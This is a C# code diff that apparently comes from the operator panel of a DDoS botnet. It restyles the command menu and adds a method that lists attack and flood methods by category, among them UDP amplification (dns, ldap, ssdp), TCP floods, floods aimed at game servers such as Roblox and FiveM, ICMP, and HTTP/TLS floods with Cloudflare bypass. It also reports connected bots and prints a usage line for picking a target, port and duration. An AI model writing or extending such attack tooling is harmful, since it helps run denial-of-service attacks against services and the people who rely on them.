@@ -717,31 +717,20 @@ namespace Agent
             if (cmdName.Equals("help", StringComparison.OrdinalIgnoreCase))
             {
                 var sb = new StringBuilder();
-                sb.AppendLine("\x1b[92m--- Available Commands ---\x1b[0m");
-                sb.AppendLine("  help              Show this help menu");
-                sb.AppendLine("  methods           List attack/execution methods");
-                sb.AppendLine("  bots              Show number of connected bots");
-                sb.AppendLine("  clear / cls       Clear terminal screen");
-                sb.AppendLine("  exit / quit       Disconnect session");
+                sb.AppendLine("\x1b[38;5;240m  ┌────────────────────────────────────────────────────────┐\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;97m                 AVAILABLE COMMANDS                     \x1b[0m\x1b[38;5;240m│\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────┤\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mhelp\x1b[0m              \x1b[90m-\x1b[0m Show this help menu                \x1b[38;5;240m│\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mmethods\x1b[0m           \x1b[90m-\x1b[0m List all attack & flood methods    \x1b[38;5;240m│\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mbots\x1b[0m              \x1b[90m-\x1b[0m Show number of connected bots      \x1b[38;5;240m│\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mclear / cls\x1b[0m       \x1b[90m-\x1b[0m Clear the terminal screen          \x1b[38;5;240m│\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mexit / quit\x1b[0m       \x1b[90m-\x1b[0m Disconnect session                 \x1b[38;5;240m│\x1b[0m");
+                sb.AppendLine("\x1b[38;5;240m  └────────────────────────────────────────────────────────┘\x1b[0m");
                 channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
             }
             else if (cmdName.Equals("methods", StringComparison.OrdinalIgnoreCase))
             {
-                var sb = new StringBuilder();
-                sb.AppendLine("\x1b[92m--- Methods List ---\x1b[0m");
-                if (_methods.Count == 0)
-                {
-                    sb.AppendLine("  (No methods configured)");
-                }
-                else
-                {
-                    sb.AppendLine("\x1b[93m[LAYER 7]\x1b[0m");
-                    foreach (var m in _methods)
-                    {
-                        sb.AppendLine($"  \x1b[96m{m.Name}\x1b[0m");
-                    }
-                }
-                channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
+                channel.SendData(Encoding.UTF8.GetBytes(GetFormattedMethodsMenu()));
             }
             else if (cmdName.Equals("bots", StringComparison.OrdinalIgnoreCase))
             {
@@ -815,6 +804,71 @@ namespace Agent
                 }
             }
             return count;
+        }
+
+        private static string GetFormattedMethodsMenu()
+        {
+            if (_methods.Count == 0)
+            {
+                return "\x1b[91m  [!] No methods configured in methods.json\x1b[0m\r\n";
+            }
+
+            var l4Udp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "dns", "udp", "ldap", "ssdp", "home", "udpbypass" };
+            var l4Tcp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "tcp", "socket", "ovh", "tcpmix", "tcpbypass", "ack" };
+            var l4Game = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp" };
+            var l3 = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "subnet", "icmp" };
+            var l7 = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http", "https", "httpx", "rapidflood", "tls", "tlsx", "bypass", "browser", "cache", "cloudflare" };
+
+            var sb = new StringBuilder();
+            sb.AppendLine();
+            sb.AppendLine("\x1b[38;5;240m  ┌────────────────────────────────────────────────────────────────────────┐\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;97m                       ATTACK & FLOOD METHODS                           \x1b[0m\x1b[38;5;240m│\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────────────────────┤\x1b[0m");
+
+            void AppendCategory(string title, string colorCode, HashSet<string> names)
+            {
+                var active = _methods.Where(m => names.Contains(m.Name)).ToList();
+                if (active.Count == 0) return;
+
+                sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  {colorCode}◈ {title}\x1b[0m");
+                int col = 0;
+                sb.Append("\x1b[38;5;240m  │\x1b[0m    ");
+                foreach (var m in active)
+                {
+                    sb.Append($"\x1b[38;5;244m•\x1b[0m \x1b[97m{m.Name,-14}\x1b[0m");
+                    col++;
+                    if (col == 4)
+                    {
+                        sb.AppendLine();
+                        sb.Append("\x1b[38;5;240m  │\x1b[0m    ");
+                        col = 0;
+                    }
+                }
+                if (col != 0) sb.AppendLine();
+                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m");
+            }
+
+            AppendCategory("LAYER 4 UDP (AMPLIFICATION & BYPASS)", "\x1b[1;95m", l4Udp);
+            AppendCategory("LAYER 4 TCP (FLOOD & BYPASS)", "\x1b[1;94m", l4Tcp);
+            AppendCategory("LAYER 4 GAME (SPECIALIZED UDP)", "\x1b[1;93m", l4Game);
+            AppendCategory("LAYER 3 (NETWORK PROTOCOLS)", "\x1b[1;91m", l3);
+            AppendCategory("LAYER 7 (HTTP / HTTPS / APPLICATION)", "\x1b[1;92m", l7);
+
+            var others = _methods.Where(m => !l4Udp.Contains(m.Name) && !l4Tcp.Contains(m.Name) &&
+                                             !l4Game.Contains(m.Name) && !l3.Contains(m.Name) &&
+                                             !l7.Contains(m.Name)).ToList();
+            if (others.Count > 0)
+            {
+                var otherSet = new HashSet<string>(others.Select(o => o.Name), StringComparer.OrdinalIgnoreCase);
+                AppendCategory("CUSTOM / OTHER METHODS", "\x1b[1;96m", otherSet);
+            }
+
+            sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────────────────────┤\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[90mUsage  :\x1b[0m \x1b[93m<method> <host/ip/url> <port> <time>\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[90mExample:\x1b[0m \x1b[38;5;45mhttps https://example.com 443 60\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  └────────────────────────────────────────────────────────────────────────┘\x1b[0m");
+
+            return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
         }
 
         private static string GetOrGenerateKey(string fileName, Func<string> generateKey)
